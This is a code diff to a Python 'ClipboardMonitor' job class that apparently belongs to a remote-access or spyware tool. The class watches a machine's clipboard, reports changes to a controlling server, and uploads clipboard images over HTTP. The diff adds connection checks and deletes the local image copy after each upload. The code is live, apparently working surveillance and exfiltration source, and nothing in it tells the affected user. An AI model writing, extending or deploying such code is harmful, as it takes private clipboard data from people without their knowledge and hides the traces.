@@ -51,13 +51,16 @@ class ClipboardMonitor(Job):
                     self._handle_text_change(clipboard_text)
                     time.sleep(self.interval)
 
-            self.send_to_server(1, 'Clipboard monitor stopped', 0)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(1, 'Clipboard monitor stopped', 0)
         except Exception as e:
-            self.send_to_server(0, f'Clipboard monitor error: {e}', 0)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(0, f'Clipboard monitor error: {e}', 0)
         finally:
             self.mark_stopped()
             logger.info(f'Thread ended: {threading.current_thread().name}')
-            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)
+            if getattr(self.server, 'is_connected', True):
+                self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)
 
     def stop(self, notify: bool = True):
         self.request_stop(notify=notify)
@@ -80,17 +83,22 @@ class ClipboardMonitor(Job):
 
                 self.send_to_server(
                     1,
-                    f'Clipboard image detected, queueing file transfer: {file_name} ({get_size(file_size)})',
+                    f'Clipboard image detected, uploading: {file_name} ({get_size(file_size)})',
                     0
                 )
 
-                self.upload_file_via_http(file_name, 'clipboard_images')
-                self.send_to_server(1, f'Clipboard image queued successfully: {file_name}', 0)
+                try:
+                    self.upload_file_via_http(file_name, 'clipboard_images')
+                    self.send_to_server(1, f'Clipboard image uploaded successfully: {file_name}', 0)
+                finally:
+                    print()
+                    try:
+                        os.remove(file_name)
+                    except Exception as e:
+                        self.send_to_server(0, f'Failed to remove temporary clipboard_image: {e}', 0)
 
             except Exception as e:
                 self.send_to_server(0, f'Failed to save clipboard image: {e}', 0)
-
-            self.send_to_server(1, 'Clipboard image sent successfully', 0)
 
     def _handle_file_change(self, files):
         file_list = ', '.join(files)
